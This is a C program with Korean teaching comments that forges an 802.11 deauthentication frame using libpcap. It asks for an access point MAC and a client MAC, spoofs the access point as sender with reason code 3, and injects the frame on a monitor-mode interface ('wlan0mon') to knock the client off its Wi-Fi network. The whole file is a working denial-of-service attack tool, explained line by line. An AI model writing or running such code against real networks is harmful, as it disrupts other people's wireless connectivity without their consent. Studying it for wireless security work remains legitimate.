#include <pcap.h>      // libpcap 라이브러리 - 패킷 캡처/전송 함수들
#include <stdio.h>     // printf, fprintf 등 입출력 함수
#include <string.h>    // memset, memcpy 등 메모리 조작 함수
#include <stdint.h>    // uint8_t, uint16_t 등 크기가 명확한 정수 타입 정의


//(struct XXX *) = 이 주소를 XXX 구조체로 해석해라.

/*
 * =====================================================
 * __attribute__((packed)) 이란?
 * =====================================================
 * 컴파일러는 보통 구조체 멤버들 사이에 "패딩(빈 공간)"을 자동으로 넣음
 * 
 * 예) 패딩 있을 때:
 *   struct { uint8_t a; uint16_t b; }
 *   메모리: [a][빈칸][b b]  → 4 bytes (패딩 1byte 추가됨)
 * 
 * 예) packed 적용 시:
 *   메모리: [a][b b]  → 3 bytes (패딩 없이 딱 붙음)
 * 
 * 네트워크 패킷은 규격이 정해져 있어서 패딩이 들어가면 안됨
 * 그래서 모든 네트워크 구조체에 packed를 붙임
 */

// ===== Radiotap 헤더 구조체 =====
// Wi-Fi 패킷을 전송할 때 맨 앞에 붙는 메타정보 헤더
// 실제 무선 신호 설정값들 (전송 속도, 채널 등)을 담음
struct radiotap_header {
    uint8_t  it_version;  // Radiotap 버전, 항상 0으로 고정
    uint8_t  it_pad;      // 정렬용 패딩, 의미없는 값 (0으로 채움)
    uint16_t it_len;      // Radiotap 헤더의 전체 길이 (bytes)
                          // 이 값만큼 건너뛰면 802.11 헤더 시작점
    uint32_t it_present;  // 이 헤더에 어떤 필드가 들어있는지 비트마스크
                          // 0 = 추가 필드 없이 최소 구성
                          // 예) bit0=1 이면 TSFT 필드 있음
                          //     bit1=1 이면 Flags 필드 있음
} __attribute__((packed));


// ===== 802.11 MAC 헤더 구조체 =====
// 실제 Wi-Fi 프레임의 헤더, 총 24 bytes
struct ieee80211_hdr {
    uint16_t frame_control; // 프레임 종류를 나타내는 필드 (2 bytes)
                            // bit 0-1  : Protocol Version (항상 00)
                            // bit 2-3  : Type (00=Management, 01=Control, 10=Data)
                            // bit 4-7  : Subtype (Management일때 12=Deauth)
                            // bit 8-15 : 각종 플래그들 (ToDS, FromDS 등)

    uint16_t duration;      // 이 프레임 전송에 걸리는 예상 시간 (마이크로초)
                            // 다른 기기들이 이 시간 동안 전송을 양보함
                            // Deauth는 그냥 0으로 설정해도 됨

    uint8_t  addr1[6];      // 수신자 MAC 주소 (6 bytes)
                            // Deauth에서는 연결을 끊을 클라이언트 MAC

    uint8_t  addr2[6];      // 송신자 MAC 주소 (6 bytes)
                            // Deauth에서는 AP(공유기)의 MAC

    uint8_t  addr3[6];      // BSSID (6 bytes)
                            // 보통 AP MAC과 동일
                            // 어느 네트워크 소속인지 식별하는 용도

    uint16_t seq_ctrl;      // 시퀀스 번호 (2 bytes)
                            // 패킷 순서 추적 / 중복 제거용
                            // Deauth는 0으로 설정해도 무방
} __attribute__((packed));


// ===== Deauth 바디 구조체 =====
// Deauth 프레임의 실제 내용, 딱 2 bytes짜리
struct deauth_body {
    uint16_t reason_code;   // 연결을 끊는 이유 코드
                            // 1  = 이유 없음 (Unspecified)
                            // 2  = 인증이 더 이상 유효하지 않음
                            // 3  = 비활성 상태로 인한 해제 (가장 자연스러운 값)
                            // 4  = AP 메모리 부족
                            // 7  = 연결되지 않은 상태에서 데이터 전송 시도
} __attribute__((packed));


/*
 * =====================================================
 * MAC 주소 문자열 → 바이트 배열 변환 함수
 * =====================================================
 * 사람이 읽기 편한 "aa:bb:cc:dd:ee:ff" 형식을
 * 컴퓨터가 쓰는 {0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff} 로 변환
 *
 * sscanf 는 scanf 랑 같은데 문자열에서 읽어옴
 * %hhx = 16진수(x)를 1바이트(hh) 크기로 읽어라
 */
void parse_mac(const char *str, uint8_t *mac) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2],
           &mac[3], &mac[4], &mac[5]);
}

// MAC 주소 형식 검증 함수
// "aa:bb:cc:dd:ee:ff" 형식이 맞는지 확인
int validate_mac(const char *str) {
    int i;
    // 길이 체크 (17글자여야 함) 왜냐면 뒤에 줄바꿈 있으니까
    if (strlen(str) < 17) return 0;

    // 형식 체크: 숫자/알파벳 2개 + 콜론 반복
    for (i = 0; i < 17; i++) {
        if (i % 3 == 2) {
            // 3번째마다 콜론이어야 함
            if (str[i] != ':') return 0;
        } else {
            // 나머지는 16진수 문자여야 함
            if (!((str[i] >= '0' && str[i] <= '9') ||
                  (str[i] >= 'a' && str[i] <= 'f') ||
                  (str[i] >= 'A' && str[i] <= 'F'))) return 0;
        }
    }
    return 1;  // 유효한 MAC
}



int main() {
    char errbuf[PCAP_ERRBUF_SIZE];  // 에러 메시지 저장 버퍼 (256 bytes)


    // ===== 1. MAC 주소 설정 =====
    uint8_t ap_mac[6];      // AP(공유기) MAC 저장할 배열
    uint8_t client_mac[6];  // 클라이언트 MAC 저장할 배열
    char ap_mac_str[18];
    char client_mac_str[18];

        // ===== MAC 주소 입력 받기 =====
    while (1) {
        printf("공유기 MAC 입력 (예: aa:bb:cc:dd:ee:ff) : ");
        fgets(ap_mac_str, sizeof(ap_mac_str), stdin);

        // fgets는 \n(엔터)도 같이 읽음 → 제거
        ap_mac_str[strcspn(ap_mac_str, "\n")] = '\0';
        //  strcspn = 특정 문자가 처음 나오는 위치 반환
        //  \n 위치를 \0(문자열 끝)으로 바꿔서 제거

        if (validate_mac(ap_mac_str)) break;  // 형식 맞으면 탈출
        printf("올바른 MAC 형식이 아닙니다. 다시 입력하세요.\n");
    }

    while (1) {
        printf("클라이언트 MAC 입력 (예: 11:22:33:44:55:66) : ");
        fgets(client_mac_str, sizeof(client_mac_str), stdin);

        client_mac_str[strcspn(client_mac_str, "\n")] = '\0';

        if (validate_mac(client_mac_str)) break;
        printf("올바른 MAC 형식이 아닙니다. 다시 입력하세요.\n");
    }


    // 본인 환경의 실제 MAC 주소로 변경해서 사용
    parse_mac(ap_mac_str, ap_mac);
    parse_mac(client_mac_str, client_mac);

    // ===== 2. 패킷 버퍼 준비 =====
    uint8_t packet[64];       // 패킷 데이터를 담을 바이트 배열
    memset(packet, 0, sizeof(packet));
    // memset = 배열 전체를 특정 값으로 채움
    // 0으로 초기화해서 쓰레기값이 안 들어가게 함


    // ===== 3. Radiotap 헤더 채우기 =====
    // packet 배열의 맨 앞 포인터를 radiotap_header 구조체로 해석
    struct radiotap_header *rth = (struct radiotap_header *)packet;
    rth->it_version = 0;                           // 버전은 항상 0
    rth->it_pad     = 0;                           // 패딩은 0
    rth->it_len     = sizeof(struct radiotap_header); // 헤더 길이 = 8 bytes
    rth->it_present = 0;                           // 추가 필드 없음


    // ===== 4. 802.11 헤더 채우기 =====
    // Radiotap 헤더 바로 뒤 위치를 ieee80211_hdr 구조체로 해석
    struct ieee80211_hdr *dot11 =
        (struct ieee80211_hdr *)(packet + sizeof(struct radiotap_header));

    /*
     * Frame Control 값 계산: 0x00C0
     *
     * 비트 배치 (16비트):
     *   15 14 13 12 | 11 10 9 8 | 7 6 | 5 4 | 3 2 1 0
     *    0  0  0  0 |  0  0 0 0 | 1 1 | 0 0 | 0 0 0 0
     *   └─ 플래그들 ┘            └Subtype=12┘└Type=0┘└Ver=0┘
     *
     *   = 0000 0000 1100 0000
     *   = 0x00C0
     *
     * x86 CPU는 리틀엔디안이라 메모리에는 0xC0, 0x00 순으로 저장됨
     * 하지만 uint16_t로 쓸 때는 그냥 0x00C0 으로 쓰면 알아서 처리됨
     */
    dot11->frame_control = 0x00C0;  // Management 프레임, Subtype=12(Deauth)
    dot11->duration      = 0;       // 시간 계산 안함, 0으로 설정

    memcpy(dot11->addr1, client_mac, 6); // 수신자 = 클라이언트 (연결 끊길 대상)
    memcpy(dot11->addr2, ap_mac,     6); // 송신자 = AP (보내는 주체)
    memcpy(dot11->addr3, ap_mac,     6); // BSSID  = AP MAC과 동일하게
    // memcpy(목적지, 출처, 크기) = 메모리 복사 함수

    dot11->seq_ctrl = 0;  // 시퀀스 번호 0으로 설정


    // ===== 5. Deauth 바디 채우기 =====
    // 802.11 헤더 바로 뒤 위치를 deauth_body 구조체로 해석
    struct deauth_body *deauth =
        (struct deauth_body *)(packet
            + sizeof(struct radiotap_header)   // radiotap 8 bytes 건너뜀
            + sizeof(struct ieee80211_hdr));   // 802.11 헤더 24 bytes 건너뜀

    deauth->reason_code = 3;  // 비활성 상태로 인한 연결 해제


    // ===== 6. 인터페이스 열기 =====
    // wlan0mon = monitor 모드 인터페이스 (airmon-ng start wlan0 으로 생성)
    // monitor 모드여야 임의의 패킷을 공중에 뿌릴 수 있음
    pcap_t *handle = pcap_open_live("wlan0mon", 65535, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "인터페이스 열기 실패: %s\n", errbuf);
        fprintf(stderr, "sudo airmon-ng start wlan0 먼저 실행하세요\n");
        return 1;  // 1 반환 = 비정상 종료
    }


    // ===== 7. 패킷 전송 =====
    // 전송할 패킷의 총 크기 계산
    int packet_len = sizeof(struct radiotap_header)  //  8 bytes
                   + sizeof(struct ieee80211_hdr)    // 24 bytes
                   + sizeof(struct deauth_body);     //  2 bytes
                                                     // = 34 bytes 총합

    /*
     * pcap_inject() : 패킷을 네트워크 인터페이스로 직접 전송
     *   handle     - 열어둔 인터페이스 핸들
     *   packet     - 전송할 패킷 데이터 (바이트 배열)
     *   packet_len - 전송할 바이트 수
     *
     * 반환값: 전송한 바이트 수, 실패 시 -1
     */
    if (pcap_inject(handle, packet, packet_len) == -1) {
        fprintf(stderr, "전송 실패: %s\n", pcap_geterr(handle));
        pcap_close(handle);
        return 1;
    }


    

    printf("\n=== 전송 완료 ===\n");
    printf("AP MAC     : %s\n", ap_mac_str);
    printf("Client MAC : %s\n", client_mac_str);
    printf("Reason Code: %d\n", deauth->reason_code);

    pcap_close(handle);
    return 0;

}